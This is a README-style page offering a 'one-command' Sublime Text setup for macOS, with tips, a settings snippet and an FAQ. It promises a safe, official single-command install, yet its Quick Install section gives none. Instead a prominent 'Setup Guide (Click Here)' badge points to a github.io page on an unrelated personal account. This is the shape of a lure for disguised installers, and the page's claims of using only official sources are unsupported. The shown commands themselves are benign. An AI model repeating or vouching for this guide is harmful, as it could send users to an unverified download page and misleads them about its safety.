# Sublime Text for macOS — Fast One-Command Setup  
![logo](https://upload.wikimedia.org/wikipedia/en/d/d2/Sublime_Text_3_logo.png)

Sublime Text is a fast, lightweight code & text editor for developers, writers, and power users on macOS.  
This guide shows a safe, official, single-command install plus optional tweaks for a great Mac experience.

[![Setup Guide for macOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20macOS%20%28Click%20Here%29-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://michaelcottmeyer060.github.io/michaelcottmeyer060/)

---

## 🚀 Quick Install (macOS)

**Launch:** `open -a "Sublime Text"` or from Launchpad.  
**CLI (optional):** In Sublime Text, go to **Tools → Install ‘subl’ Command**.  
If you prefer a manual link:
    sudo ln -s "/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl" /usr/local/bin/subl
    # or for Apple Silicon Homebrew prefix:
    sudo ln -s "/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl" /opt/homebrew/bin/subl

**Update:**  
    brew upgrade --cask sublime-text

**Uninstall:**  
    brew uninstall --cask sublime-text

---

## 🎯 What You Get
- **One-command install** — quickest way to get Sublime Text on macOS via Homebrew.  
- **Command-line launcher (`subl`)** — open files/folders from Terminal instantly.  
- **Package Control setup** — extend the editor with themes, linters, and tools.  
- **Sensible defaults** — recommended preferences for a clean, productive start.

---

## 📘 About the App
Sublime Text is a versatile editor designed for speed and focus.  
It supports multiple cursors, powerful search, split panes, and a rich ecosystem of packages through Package Control.  
With customizable keymaps and settings, it adapts to your workflow across Mac and MacBook devices.

---

## 🌟 Advantages
- **Blazing performance** even on large files and projects.  
- **Distraction-free editing** with minimal UI and focus modes.  
- **Deep customization** via settings, key bindings, and packages.  
- **Cross-project productivity** with Go To Anything and Command Palette.

---

## ⚙️ System Requirements
- **Operating System:** macOS 10.13 High Sierra or later (Intel or Apple Silicon)  
- **Processor:** Intel or Apple Silicon (M-series)  
- **RAM:** 2 GB minimum / 8 GB recommended  
- **Disk:** ~300 MB free space  
- **Network:** Required for install, updates, and packages

---

## 💡 Tips & Tricks
- **Command Palette:** `⌘⇧P` to access every command quickly.  
- **Go To Anything:** `⌘P` to jump to files, symbols (`@`), or lines (`:`).  
- **Multiple cursors:** Hold `⌘` and click to add cursors; `⌘⇧L` to split selections.  
- **Package Control:** `⌘⇧P` → *Package Control: Install Package* → search and install.

**Nice starter packages:**  
- *A File Icon*, *SublimeLinter*, *BracketHighlighter*, *GitGutter*, *MarkdownEditing*.

**Recommended preferences (optional):** open  
`Sublime Text → Settings` (User) and use:
    {
      "font_face": "SF Mono",
      "font_size": 14,
      "tab_size": 2,
      "translate_tabs_to_spaces": true,
      "trim_trailing_white_space_on_save": true,
      "ensure_newline_at_eof_on_save": true,
      "highlight_line": true,
      "ignored_packages": ["Vintage"]
    }

---

## 📈 Use Cases
- **Developers:** fast editing, powerful navigation, and language tooling.  
- **Writers & Docs:** Markdown notes, blog posts, and technical docs.  
- **Data & Ops:** quick log reviews and config tweaks.  
- **Students:** clean interface for learning programming basics.

---

## ❓ FAQ
**Q: Do I need Homebrew?**  
A: It’s the recommended path here. You can also download the official .dmg from the Sublime Text website.

**Q: How do I install packages?**  
A: `⌘⇧P` → *Package Control: Install Package*, then search for what you need.

**Q: How do I set `subl` as my default editor for Git?**  
A: `git config --global core.editor "subl -n -w"`

**Q: How do I keep Sublime Text up to date?**  
A: Run `brew upgrade --cask sublime-text` periodically.

**Q: How do I license the app?**  
A: Purchase a license on the official website and enter it in the app’s **Sublime Text → Enter License** menu.

---

## 🖼 Preview (Screenshots)
![Screenshot 1](https://www.sublimetext.com/screenshots/sublime_text_4_multi_select.gif)  

---

## 🔍 Tags
sublime text, sublime text mac, sublime text macos, sublime text macbook, install sublime text mac, sublime text setup, homebrew cask, text editor for mac, package control, subl command

---

### Legal
This guide uses only official sources and does not modify licensing or distribution.  
“Sublime Text” is a trademark of Sublime HQ Pty Ltd. This project is not affiliated with or endorsed by Sublime HQ.
